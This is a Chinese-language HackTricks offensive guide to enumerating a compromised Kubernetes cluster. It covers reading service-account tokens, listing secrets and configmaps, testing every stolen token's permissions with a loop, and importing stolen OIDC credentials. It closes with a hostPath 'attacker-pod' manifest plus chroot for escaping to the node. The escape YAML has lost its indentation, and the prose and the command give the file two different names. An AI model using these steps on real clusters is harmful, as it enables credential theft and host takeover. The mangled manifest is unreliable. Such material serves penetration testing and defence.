# Kubernetes 枚举

<details>

<summary><strong>从零到英雄学习 AWS 黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## Kubernetes 令牌

如果您已经侵入了一台机器，用户可能有权访问某些 Kubernetes 平台。令牌通常位于 **env var `KUBECONFIG`** 指向的文件中或 **`~/.kube`** 内。

在这个文件夹中，您可能会找到带有**令牌和配置以连接到 API 服务器**的配置文件。在这个文件夹中，您还可以找到一个缓存文件夹，其中包含以前检索的信息。

如果您已经侵入了 Kubernetes 环境中的一个 pod，还有其他地方可以找到令牌和有关当前 K8 环境的信息：

### 服务账户令牌

在继续之前，如果您不知道 Kubernetes 中的服务是什么，我建议您**点击此链接并至少阅读有关 Kubernetes 架构的信息。**

摘自 Kubernetes [文档](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server)：

_“当您创建一个 pod 时，如果您没有指定服务账户，它会自动分配同一命名空间中的_默认_服务账户。”_

**ServiceAccount** 是 Kubernetes 管理的一个对象，用于为在 pod 中运行的进程提供身份。\
每个服务账户都有一个与之相关的秘密，这个秘密包含一个承载令牌。这是一个 JSON Web 令牌（JWT），是一种在两方之间安全表示声明的方法。

通常以下目录之一：

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

包含文件：

* **ca.crt**：它是用于检查 kubernetes 通信的 ca 证书
* **namespace**：它指示当前命名空间
* **token**：它包含当前 pod 的**服务令牌**。

现在您有了令牌，您可以在环境变量 **`KUBECONFIG`** 中找到 API 服务器。有关更多信息，请运行 `(env | set) | grep -i "kuber|kube`**`"`**

服务账户令牌由位于文件 **sa.key** 中的密钥签名，并由 **sa.pub** 验证。

**Kubernetes** 上的默认位置：

* /etc/kubernetes/pki

**Minikube** 上的默认位置：

* /var/lib/localkube/certs

### 热 Pods

_**热 Pods 是**_ 包含特权服务账户令牌的 pods。特权服务账户令牌是一个有权限执行特权任务的令牌，例如列出秘密、创建 pods 等。

## RBAC

如果您不知道什么是 **RBAC**，**请阅读本节**。

## 枚举备忘单

为了枚举 K8s 环境，您需要以下几点：

* 一个**有效的认证令牌**。在上一节中，我们看到了在哪里搜索用户令牌和服务账户令牌。
* **地址（**_**https://host:port**_**）的 Kubernetes API**。这通常可以在环境变量和/或 kube 配置文件中找到。
* **可选**：**ca.crt 以验证 API 服务器**。这可以在可以找到令牌的同一地方找到。这对于验证 API 服务器证书很有用，但是使用 `kubectl` 的 `--insecure-skip-tls-verify` 或 `curl` 的 `-k`，您将不需要这个。

有了这些细节，您可以**枚举 kubernetes**。如果**API** 出于某种原因可以通过**互联网**访问，您可以下载该信息并从您的主机枚举平台。

然而，通常**API 服务器位于内部网络中**，因此您需要通过受损机器**创建隧道**以从您的机器访问它，或者您可以**上传** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) 二进制文件，或使用 **`curl/wget/anything`** 执行对 API 服务器的原始 HTTP 请求。

### `list` 和 `get` 动词之间的区别

使用 **`get`** 权限，您可以访问特定资产的信息（_`kubectl` 中的 `describe` 选项_）API：
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
如果你拥有 **`list`** 权限，你可以执行 API 请求来列出一种类型的资产（_`kubectl` 中的 `get` 选项_）：
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
如果你拥有 **`watch`** 权限，你可以执行 API 请求来监控资产：
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
它们打开一个流连接，每当 Deployment 发生变化（或创建新的 Deployment 时），就会返回完整的清单。

{% hint style="danger" %}
以下的 `kubectl` 命令仅表示如何列出对象。如果你想访问数据，需要使用 `describe` 而不是 `get`
{% endhint %}

### 使用 curl

在 pod 内部，你可以使用几个环境变量：
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
默认情况下，pod 可以**访问**域名为 **`kubernetes.default.svc`** 的 **kube-api server**，你可以在 **`/etc/resolv.config`** 中看到 kube 网络，因为这里你会找到 kubernetes DNS 服务器的地址（同一范围的“.1”是 kube-api 端点）。
{% endhint %}

### 使用 kubectl

拥有令牌和 API 服务器的地址后，你可以使用 kubectl 或 curl 如下所示访问它：

默认情况下，APISERVER 通过 `https://` 方案进行通信
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> 如果 url 中没有 `https://`，你可能会收到像 Bad Request 这样的错误。

你可以在[**这里找到官方的 kubectl 速查表**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)。以下各节的目标是按顺序介绍不同的选项，以枚举和理解你获得访问权限的新 K8s。

要找到 `kubectl` 发送的 HTTP 请求，你可以使用参数 `-v=8`

#### MitM kubectl - 代理化 kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### 当前配置

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

如果您设法窃取了一些用户凭证，您可以使用类似以下方法在**本地配置**它们：
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### 获取支持的资源

通过这些信息，您将知道所有您可以列出的服务

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### 获取当前权限

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

另一种检查你权限的方法是使用工具：[**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

你可以在以下内容中了解更多关于**Kubernetes RBAC**的信息：

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**一旦你知道了你拥有哪些权限**，查看以下页面以了解**你是否可以滥用这些权限**来提升权限：

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### 获取其他角色

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### 获取命名空间

Kubernetes 支持由同一个物理集群支持的**多个虚拟集群**。这些虚拟集群被称为**命名空间**。

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### 获取秘密

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

如果您能读取秘密，您可以使用以下行来获取与每个令牌相关的权限：
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### 获取服务账户

如本页开头所讨论的，**当运行一个 pod 时，通常会为其分配一个服务账户**。因此，列出服务账户、它们的权限以及它们的运行位置可能允许用户提升权限。

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### 获取部署

部署指定了需要**运行**的**组件**。

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### 获取 Pods

Pods 是实际将要**运行**的**容器**。

{% tabs %}
{% tab title="kubectl" %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### 获取服务

Kubernetes **服务**用于**在特定端口和IP上暴露服务**（它将作为负载均衡器对实际提供服务的pods进行操作）。了解在哪里可以找到其他服务以尝试攻击是很有趣的。

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### 获取节点

获取集群内**配置的所有节点**。

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### 获取 DaemonSets

**DaemonSets** 确保**特定的 pod 在集群的所有节点上运行**（或在选定的节点上）。如果你删除 DaemonSet，它管理的 pods 也会被移除。

{% tabs %}
{% tab title="kubectl" %}
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### 获取 cronjob

Cron jobs 允许使用 crontab 类似的语法来安排启动 pod，该 pod 将执行某些操作。

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### 获取 configMap

configMap 总是包含许多信息和配置文件，这些文件提供给在 kubernetes 中运行的应用程序。通常，您可以找到许多用于连接和验证其他内部/外部服务的密码、秘密、令牌。

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}

{% endtabs %}


### 获取 "all"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
{% endtab %}
{% endtabs %}

### **获取 Pods 消耗情况**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### 从 pod 逃逸

如果您能够创建新的 pod，您可能能够从它们逃逸到节点。为此，您需要使用 yaml 文件创建一个新的 pod，切换到创建的 pod，然后使用 chroot 进入节点的系统。您可以使用已经存在的 pod 作为 yaml 文件的参考，因为它们显示了现有的镜像和路径。
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> 如果您需要在特定节点上创建 pod，可以使用以下命令获取节点上的标签
>
> `k get nodes --show-labels`
>
> 通常，kubernetes.io/hostname 和 node-role.kubernetes.io/master 都是选择的好标签。
>
> [参考资料]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

然后您创建您的 attack.yaml 文件
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
```markdown
[原始 YAML 源码](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

之后你创建 pod
```
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
现在您可以按如下方式切换到创建的 pod：
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
最后，你使用 chroot 进入节点的系统
```bash
chroot /root /bin/bash
```
从以下资源获取的信息：[Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [攻击与防御 Kubernetes: Bust-A-Kube – 第1集](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## 参考资料

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习 AWS 黑客技术！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF** 版本，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧。

</details>
